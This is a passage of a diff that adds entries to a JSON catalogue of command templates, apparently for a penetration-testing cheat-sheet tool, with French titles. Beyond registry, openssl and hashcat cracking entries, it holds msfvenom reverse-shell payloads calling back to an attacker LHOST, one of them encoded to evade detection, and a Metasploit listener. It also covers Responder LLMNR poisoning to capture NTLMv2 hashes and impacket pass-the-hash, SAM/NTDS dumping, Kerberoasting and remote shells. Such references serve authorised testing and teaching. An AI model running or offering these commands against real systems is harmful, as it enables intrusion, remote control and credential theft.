+        {"title": "Lire clé registre", "cmd": "reg query {KEY}", "vars": ["KEY"]},
+        {"title": "Autostart (HKLM)", "cmd": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "vars": []},
+        {"title": "Processus avec CommandLine", "cmd": "wmic process get Caption,ProcessId,CommandLine", "vars": []}
+      ]
+    },
+    {
+      "tool": "hashcat",
+      "category": "Hash / Encodage",
+      "description": "Cracker de hashs GPU — md5, sha, ntlm, bcrypt et plus",
+      "commands": [
+        {"title": "Crack MD5 avec wordlist", "cmd": "hashcat -m 0 -a 0 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]},
+        {"title": "Crack NTLM", "cmd": "hashcat -m 1000 -a 0 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]},
+        {"title": "Crack NTLMv2 (Responder)", "cmd": "hashcat -m 5600 -a 0 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]},
+        {"title": "Crack SHA-256", "cmd": "hashcat -m 1400 -a 0 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]},
+        {"title": "Crack bcrypt", "cmd": "hashcat -m 3200 -a 0 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]},
+        {"title": "Attaque par règles", "cmd": "hashcat -m {MODE} -r {RULES} {HASHFILE} {WORDLIST}", "vars": ["MODE","RULES","HASHFILE","WORDLIST"]},
+        {"title": "Attaque masque (brute)", "cmd": "hashcat -m {MODE} -a 3 {HASHFILE} ?u?l?l?l?d?d", "vars": ["MODE","HASHFILE"]},
+        {"title": "Afficher résultats", "cmd": "hashcat {HASHFILE} --show", "vars": ["HASHFILE"]}
+      ]
+    },
+    {
+      "tool": "openssl",
+      "category": "Hash / Encodage",
+      "description": "Cryptographie, certificats, encodage et débogage TLS",
+      "commands": [
+        {"title": "Tester connexion TLS", "cmd": "openssl s_client -connect {TARGET}:443", "vars": ["TARGET"]},
+        {"title": "Infos certificat", "cmd": "openssl x509 -in {CERT} -text -noout", "vars": ["CERT"]},
+        {"title": "Générer hash MD5", "cmd": "echo -n \"{STRING}\" | openssl dgst -md5", "vars": ["STRING"]},
+        {"title": "Générer hash SHA-256", "cmd": "echo -n \"{STRING}\" | openssl dgst -sha256", "vars": ["STRING"]},
+        {"title": "Encoder en base64", "cmd": "echo -n \"{STRING}\" | openssl base64", "vars": ["STRING"]},
+        {"title": "Décoder base64", "cmd": "echo \"{B64}\" | openssl base64 -d", "vars": ["B64"]},
+        {"title": "Chiffrer fichier AES-256", "cmd": "openssl enc -aes-256-cbc -in {FILE} -out {FILE}.enc", "vars": ["FILE"]},
+        {"title": "Générer clé privée RSA", "cmd": "openssl genrsa -out private.key {BITS}", "vars": ["BITS"]}
+      ]
+    },
+    {
+      "tool": "msfvenom",
+      "category": "Pentest",
+      "description": "Générateur de payloads Metasploit — shells, stagers, encodeurs",
+      "commands": [
+        {"title": "Payload Windows EXE", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe", "vars": ["LHOST","LPORT"]},
+        {"title": "Payload Linux ELF", "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o payload", "vars": ["LHOST","LPORT"]},
+        {"title": "Reverse shell PHP", "cmd": "msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php", "vars": ["LHOST","LPORT"]},
+        {"title": "Reverse shell Python", "cmd": "msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw", "vars": ["LHOST","LPORT"]},
+        {"title": "Payload encodé (xor)", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x64/xor_dynamic -f exe -o encoded.exe", "vars": ["LHOST","LPORT"]},
+        {"title": "Lister payloads filtrés", "cmd": "msfvenom -l payloads | grep {FILTER}", "vars": ["FILTER"]},
+        {"title": "Listener multi/handler", "cmd": "msfconsole -q -x \"use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run\"", "vars": ["LHOST","LPORT"]}
+      ]
+    },
+    {
+      "tool": "responder",
+      "category": "Pentest",
+      "description": "Poison LLMNR/NBT-NS pour capturer des hashs NTLMv2 sur le réseau",
+      "commands": [
+        {"title": "Écouter sur interface", "cmd": "responder -I {INTERFACE}", "vars": ["INTERFACE"]},
+        {"title": "Mode analyse passif", "cmd": "responder -I {INTERFACE} -A", "vars": ["INTERFACE"]},
+        {"title": "Avec SMB + HTTP forcé", "cmd": "responder -I {INTERFACE} -wF", "vars": ["INTERFACE"]},
+        {"title": "Voir hashs NTLMv2 capturés", "cmd": "cat /usr/share/responder/logs/SMB-NTLMv2-SSP-{TARGET}.txt", "vars": ["TARGET"]},
+        {"title": "Cracker hash NTLMv2", "cmd": "hashcat -m 5600 {HASHFILE} {WORDLIST}", "vars": ["HASHFILE","WORDLIST"]}
+      ]
+    },
+    {
+      "tool": "impacket",
+      "category": "Pentest",
+      "description": "Suite Python pour protocoles Windows — SMB, LDAP, Kerberos, AD",
+      "commands": [
+        {"title": "Shell SMB (PsExec)", "cmd": "impacket-psexec {DOMAIN}/{USER}:{PASSWORD}@{TARGET}", "vars": ["DOMAIN","USER","PASSWORD","TARGET"]},
+        {"title": "Pass-the-Hash", "cmd": "impacket-psexec {DOMAIN}/{USER}@{TARGET} -hashes :{HASH}", "vars": ["DOMAIN","USER","TARGET","HASH"]},
+        {"title": "Dump SAM/NTDS distant", "cmd": "impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET}", "vars": ["DOMAIN","USER","PASSWORD","TARGET"]},
+        {"title": "Kerberoasting", "cmd": "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -request", "vars": ["DOMAIN","USER","PASSWORD"]},
+        {"title": "AS-REP Roasting", "cmd": "impacket-GetNPUsers {DOMAIN}/ -usersfile {USERLIST} -no-pass", "vars": ["DOMAIN","USERLIST"]},
+        {"title": "WMI shell distant", "cmd": "impacket-wmiexec {DOMAIN}/{USER}:{PASSWORD}@{TARGET}", "vars": ["DOMAIN","USER","PASSWORD","TARGET"]}
       ]
     }
   ]
